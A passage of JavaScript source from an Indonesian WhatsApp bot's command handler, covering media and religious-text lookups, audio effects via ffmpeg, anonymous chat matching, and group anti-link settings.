case "sound128":
case "sound129":
case "sound130":
case "sound131":
case "sound132":
case "sound133":
case "sound134":
case "sound135":
case "sound136":
case "sound137":
case "sound138":
case "sound139":
case "sound140":
case "sound141":
case "sound142":
case "sound143":
case "sound144":
case "sound145":
case "sound146":
case "sound147":
case "sound148":
case "sound149":
case "sound150":
case "sound151":
case "sound152":
case "sound153":
case "sound154":
case "sound155":
case "sound156":
case "sound157":
case "sound158":
case "sound159":
case "sound160":
case "sound161":
if (isBan) return 
onlyWait()
xeony_buffer = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await zyren.sendMessage(m.chat, { audio: xeony_buffer, mimetype: "audio/mp4", ptt: true }, { quoted: m })     
break
//=================================================//
case "cerpen":{
if (isBan) return //sticBanLu(from)
if (!q) return setReply(`

Judul cerpen yang tersedia lihat di list *CERPEN MENU*
 
cerpen anak
cerpen bahasa daerah
cerpen bahasa inggrisKak
cerpen bahasa jawa
cerpen bahasa sunda
cerpen budaya
cerpen cinta
cerpen cinta islami
cerpen cinta pertama
cerpen cinta romantis
cerpen cinta sedih
cerpen cinta segitiga
cerpen cinta sejati
cerpen galau
cerpen gokil
cerpen inspiratif
cerpen jepang
cerpen kehidupan
cerpen keluarga
cerpen kisah nyata
cerpen korea
cerpen kristen
cerpen liburan
cerpen lingkungan
cerpen lucu
cerpen malaysia
cerpen mengharukan
cerpen misteri
cerpen motivasi
cerpen nasihat
cerpen nasionalisme
cerpen olahraga
cerpen patah hati
cerpen penantian
cerpen pendidikan
cerpen pengalaman pribadi
cerpen pengorbanan
cerpen penyesalan
cerpen perjuangan
cerpen perpisahan
cerpen persahabatan
cerpen petualangan
cerpen ramadhan
cerpen remaja
cerpen renungan
cerpen rindu
cerpen rohani
cerpen romantis
cerpen sastra
cerpen sedih
cerpen sejarah
cerpen slice of life
cerpen terjemahan
cerpen thriller

`)
let cerpe = await cerpen(q)
var memek = await getBuffer(picak+`Cerpen ${q}`)
await zyren.send5ButImg(from, `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`, `${ownerName}`,memek, [{"urlButton": {"displayText": "𝐘𝐨𝐮𝐓𝐮𝐛𝐞 Creator","url": `${youtube}`}}] )
}
break
//=================================================//
case "zodiak": case "zodiac": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix+ command} 7 7 2005`) 
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == "Invalid Date") return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
let zodiac = await getZodiac(birth[1], birth[2])
let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "shio": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`) 
let anu = await primbon.shio(text)
if (anu.status == false) return setReply(anu.message)
zyren.sendText(m.chat, `⭔ *Hasil :* ${anu.message}`, m)
}
break
//=================================================// 
case "umma": case "ummadl": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`) 
let { umma } = require("../basetzy/lib) scraper")
let anu = await umma(isUrl(text)[0])
if (anu.type == "video") {
let buttons = [
{buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: "♫ Audio"}, type: 1},
{buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: "► Video"}, type: 1}
]
let buttonMessage = {
image: { url: anu.author.profilePic },
caption: `
⭔ Title : ${anu.title}
⭔ Author : ${anu.author.name}
⭔ Like : ${anu.like}
⭔ Caption : ${anu.caption}
⭔ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
footer: copyright,
buttons,
headerType: 4
}
zyren.sendMessage(m.chat, buttonMessage, { quoted: tzy })
} else if (anu.type == "image") {
anu.media.map(async (url) => {
zyren.sendMessage(m.chat, { image: { url }, caption: `⭔ Title : ${anu.title}\n⭔ Author : ${anu.author.name}\n⭔ Like : ${anu.like}\n⭔ Caption : ${anu.caption}` }, { quoted: tzy })
})
}
}
break
//=================================================//
case "ringtone": {
if (isBan) return //sticBanLu(from)
if (!text) return setReply(`Example : ${prefix + command} black rover`) 
let anu = await ringtone(text)
let result = anu[Math.floor(Math.random() * anu.length)]
zyren.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+".mp3", mimetype: "audio/mpeg" }, { quoted: tzy })
}
break
//=================================================//
case "iqra": {
if (isBan) return //sticBanLu(from)
oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) return oh
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
zyren.sendMessage(m.chat, {document: yy, mimetype: "application/pdf", fileName: `iqra${text}.pdf`}, {quoted:tzy}).catch ((err) => setReply(oh))
}
break
//=================================================//
case "juzamma": {
if (isBan) return //sticBanLu(from)
if (args[0] === "pdf") {
zyren.sendMessage(m.chat, {document: {url: "https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf"}, mimetype: "application/pdf", fileName: "juz-amma-arab-latin-indonesia.pdf"}, {quoted:tzy})
} else if (args[0] === "docx") {
zyren.sendMessage(m.chat, {document: {url: "https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx"}, mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", fileName: "juz-amma-arab-latin-indonesia.docx"}, {quoted:tzy})
} else if (args[0] === "pptx") {
zyren.sendMessage(m.chat, {document: {url: "https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx"}, mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation", fileName: "juz-amma-arab-latin-indonesia.pptx"}, {quoted:tzy})
} else if (args[0] === "xlsx") {
zyren.sendMessage(m.chat, {document: {url: "https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx"}, mimetype: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", fileName: "juz-amma-arab-latin-indonesia.xlsx"}, {quoted:tzy})
} else {
setReply(`Mau format apa ? Example : ${prefix + command} pdf
Format yang tersedia : pdf, docx, pptx, xlsx`)
}
}
break
//=================================================//
case "hadis": case "hadist": {
if (isBan) return //sticBanLu(from)
if (!args[0]) return setReply(`Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1
Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`) 
if (!args[1]) return setReply(`Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`) 
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
setReply(`No. ${number}
${arab}
${id}`)
} catch (e) {
setReply(`Hadis tidak ditemukan !`)
}
}
break
//=================================================//
case "alquran": {
if (isBan) return //sticBanLu(from)
if (!args[0]) return setReply(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`) 
if (!args[1]) return setReply(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`) 
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
zyren.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: "audio/mpeg"}, { quoted : tzy })
}
break
//=================================================//
case "tafsirsurah": {
if (isBan) return //sticBanLu(from)
if (!args[0]) return setReply(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`) 
if (!args[1]) return setReply(`Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`) 
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
let txt = `「 *Tafsir Surah*」
*Pendek* : ${res.result.data.tafsir.id.short}
*Panjang* : ${res.result.data.tafsir.id.long}
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
setReply(txt)
}
break
//=================================================//
 case "bass": case "blown": case "deep": case "earrape": case "fast": case "fat": case "nightcore": case "reverse": case "robot": case "slow": case "smooth": case "tupai":
try {
if (isBan) return //sticBanLu(from)
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
const fileName = fs.readdirSync("./media/sampahnye").length + 1
const media = await zyren.downloadAndSaveMediaMessage(quoted, `./media/sampahnye/${fileName}`)
let ran = getRandom(".mp3")
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return setReply(err)
let buff = fs.readFileSync(ran)
zyren.sendMessage(m.chat, { audio: buff, mimetype: "audio/mpeg" }, { quoted : tzy })
fs.unlinkSync(ran)
})
} else setReply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
} catch (e) {
setReply(e)
}
break
//=================================================//
case "setcmd": {
if (!isCreator) return
if (!m.quoted) return setReply("Reply Pesan!") 
if (!m.quoted.fileSha256) return setReply("SHA256 Hash Missing") 
if (!text) return setReply(`Untuk Command Apa?`) 
let hash = m.quoted.fileSha256.toString("base64")
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return setReply("You have no permission to change this sticker command") 
global.db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
setReply(`Done!`)
}
break
//=================================================//
case "delcmd": {
if (!isCreator) return
let hash = m.quoted.fileSha256.toString("base64")
if (!hash) return setReply(`Tidak ada hash`) 
if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) return setReply("You have no permission to delete this sticker command") 
delete global.db.data.sticker[hash]
setReply(`Done!`)
}
break
//=================================================//
case "listcmd": {
if (!isCreator) return onlyOwner()
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join("\n")}
`.trim()
zyren.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
}
break
//=================================================//
case "lockcmd": {
if (!isCreator) return
if (!m.quoted) return setReply("Reply Pesan!") 
if (!m.quoted.fileSha256) return setReply("SHA256 Hash Missing") 
let hash = m.quoted.fileSha256.toString("base64")
if (!(hash in global.db.data.sticker)) return setReply("Hash not found in database") 
global.db.data.sticker[hash].locked = !/^un/i.test(command)
setReply("Done!")
}
break
//=================================================//
case "addmsg": {
if (!isCreator) return
if (!m.quoted) return setReply("Reply Message Yang Ingin Disave Di Database") 
if (!text) return setReply(`Example : ${prefix + command} nama file`) 
let msgs = global.db.data.database
if (text.toLowerCase() in msgs) return setReply(`"${text}" telah terdaftar di list pesan`) 
msgs[text.toLowerCase()] = quoted.fakeObj
setReply(`Berhasil menambahkan pesan di list pesan sebagai "${text}"

Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
}
break
//=================================================//
case "getmsg": {
if (!isCreator) return
if (!text) return setReply(`Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`) 
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return setReply(`"${text}" tidak terdaftar di list pesan`) 
zyren.copyNForward(m.chat, msgs[text.toLowerCase()], true)
}
break
//=================================================//
case "listmsg": {
if (!isCreator) return
let msgs = JSON.parse(fs.readFileSync("./basetzy/mytzy/database.json"))
let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
let teks = "「 LIST DATABASE 」\n\n"
for (let i of seplit) {
teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, "")}\n────────────────────────\n\n`
}
setReply(teks)
}
break
//=================================================//
case "delmsg": case "deletemsg": {
if (!isCreator) return
let msgs = global.db.data.database
if (!(text.toLowerCase() in msgs)) return setReply(`"${text}" tidak terdaftar didalam list pesan`)
delete msgs[text.toLowerCase()]
setReply(`Berhasil menghapus "${text}" dari list pesan`)
}
break
//=================================================//
case "anonymous": {
if (!isCreator) return
if (m.isGroup) return setReply(mess.private)
this.anonymous = this.anonymous ? this.anonymous : {}
let buttons = [
{ buttonId: "start", buttonText: { displayText: "Start" }, type: 1 }
]
zyren.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await zyren.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, zyren.user.name, m)
}
break
//=================================================//
case "keluar": case "leave": {
if (m.isGroup) return setReply(mess.private)
this.anonymous = this.anonymous ? this.anonymous : {}
let room = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!room) {
let buttons = [
{ buttonId: "start", buttonText: { displayText: "Start" }, type: 1 }
]
await zyren.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
return false
}
setReply("Ok")
let other = room.other(m.sender)
if (other) await zyren.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
delete this.anonymous[room.id]
if (command === "leave") 
break
}
case "mulai": case "start": {
if (m.isGroup) return setReply(mess.private)
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
let buttons = [
{ buttonId: "keluar", buttonText: { displayText: "Stop" }, type: 1 }
]
await zyren.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, zyren.user.name, m)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === "WAITING" && !room.check(m.sender))
if (room) {
let buttons = [
{ buttonId: "next", buttonText: { displayText: "Skip" }, type: 1 },
{ buttonId: "keluar", buttonText: { displayText: "Stop" }, type: 1 }
]
await zyren.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, zyren.user.name, m)
room.b = m.sender
room.state = "CHATTING"
await zyren.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, zyren.user.name, m)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: "",
state: "WAITING",
check: function (who = "") {
return [this.a, this.b].includes(who)
},
other: function (who = "") {
return who === this.a ? this.b : who === this.b ? this.a : ""
},
}
let buttons = [
{ buttonId: "keluar", buttonText: { displayText: "Stop" }, type: 1 }
]
await zyren.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, zyren.user.name, m)
}
break
}
case "next": case "lanjut": {
if (m.isGroup) return setReply(mess.private)
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
let buttons = [
{ buttonId: "start", buttonText: { displayText: "Start" }, type: 1 }
]
await zyren.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
return false
}
let other = romeo.other(m.sender)
if (other) await zyren.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === "WAITING" && !room.check(m.sender))
if (room) {
let buttons = [
{ buttonId: "next", buttonText: { displayText: "Skip" }, type: 1 },
{ buttonId: "keluar", buttonText: { displayText: "Stop" }, type: 1 }
]
await zyren.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, zyren.user.name, m)
room.b = m.sender
room.state = "CHATTING"
await zyren.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, zyren.user.name, m)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: "",
state: "WAITING",
check: function (who = "") {
return [this.a, this.b].includes(who)
},
other: function (who = "") {
return who === this.a ? this.b : who === this.b ? this.a : ""
},
}
let buttons = [
{ buttonId: "keluar", buttonText: { displayText: "Stop" }, type: 1 }
]
await zyren.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, zyren.user.name, m)
}
break
}
//=================================================//
case "antilink":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiLink == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilink = true
setReply("Mode anti link telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiLink == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilink = false
setReply("Mode anti link telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI LINK`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antilinkgc":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiLinkGroup == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilinkgc = true
setReply("Mode anti link group telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiLinkGroup == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilinkgc = false
setReply("Mode anti link group telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI LINK GROUP`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antilinkyt":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] && !args[1]) {
zyren.sendButMessage(m.chat, `MODE ANTI LINK YOUTUBE ${args[0].toUpperCase()}`, copyright, [
{ buttonId: `${prefix + command} ${args[0]} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} ${args[0]} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
} else if (args[0] === "channel" && args[1] === "on" || args[0] === "channel" && args[1] === "enable" || args[0] === "channel" && args[1] === "1") {
if (isAntiLinkYtChannel == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilinkytchannel = true
setReply("Mode anti link youtube channel telah aktif")
} else if (args[0] === "channel" && args[1] === "off" || args[0] === "channel" && args[1] === "disable" || args[0] === "channel" && args[1] === "0") {
if (isAntiLinkYtChannel == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilinkytchannel = false
setReply("Mode anti link youtube channel telah nonaktif")
} else if (args[0] === "video" && args[1] === "on" || args[0] === "video" && args[1] === "enable" || args[0] === "video" && args[1] === "1") {
if (isAntiLinkYtVideo == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilinkytvideo = true
setReply("Mode anti link youtube video telah aktif")
} else if (args[0] === "video" && args[1] === "off" || args[0] === "video" && args[1] === "disable" || args[0] === "video" && args[1] === "0") {
if (isAntiLinkYtVideo == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilinkytvideo = false
setReply("Mode anti link youtube video telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI LINK YOUTUBE`, copyright, [
{ buttonId: `${prefix + command} channel`, buttonText: { displayText: "𝙲𝙷𝙰𝙽𝙽𝙴𝙻" }, type: 1 },
{ buttonId: `${prefix + command} video`, buttonText: { displayText: "𝚅𝙸𝙳𝙴𝙾" }, type: 1 }], m)
}
break
//=================================================//
case "antilinkfb":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiLinkFacebook == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilinkfb = true
setReply("Mode anti link facebook telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiLinkFacebook == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilinkfb = false
setReply("Mode anti link facebook telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI LINK FACEBOOK`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antilinkig":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiLinkInstagram == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilinkig = true
setReply("Mode anti link instagram telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiLinkInstagram == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilinkig = false
setReply("Mode anti link instagram telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI LINK INSTAGRAM`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antilinktele":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiLinkTelegram == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilinktele = true
setReply("Mode anti link telegram telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiLinkTelegram == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilinktele = false
setReply("Mode anti link telegram telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI LINK TELEGRAM`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antilinkwa":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiLinkWhatsapp == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilinkwa = true
setReply("Mode anti link whatsapp telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiLinkWhatsapp == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilinkwa = false
setReply("Mode anti link whatsapp telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI LINK WHATSAPP`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antilinktiktok":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiLinkTiktok == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilinktiktok = true
setReply("Mode anti link tiktok telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiLinkTiktok == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilinktiktok = false
setReply("Mode anti link tiktok telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI LINK TIKTOK`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antilinktwitter":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiLinkTwitter == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antilinktwitter = true
setReply("Mode anti link twitter telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiLinkTwitter == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antilinktwitter = false
setReply("Mode anti link twitter telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI LINK TWITTER`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antivirtex":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiVirtex == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antivirtex = true
setReply("Mode anti virtex telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiVirtex == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antivirtex = false
setReply("Mode anti virtex telah nonaktif")
} else {
zyren.sendButMessage(m.chat, `MODE ANTI VIRTEX`, copyright, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: "ON" }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: "OFF" }, type: 1 }], m)
}
break
//=================================================//
case "antiasing":
if (!m.isGroup) return onlyGroup()
if (!isBotAdmins) return onlyBadmin()
if (!isAdmins && !isCreator) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (isAntiAsing == true) return setReply("Sudah aktif")
db.data.chats[m.chat].antiasing = true
setReply("Mode anti asing telah aktif")
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (isAntiAsing == false) return setReply("Sudah nonaktif")
db.data.chats[m.chat].antiasing = false
setReply("Mode anti asing telah nonaktif")
} else {
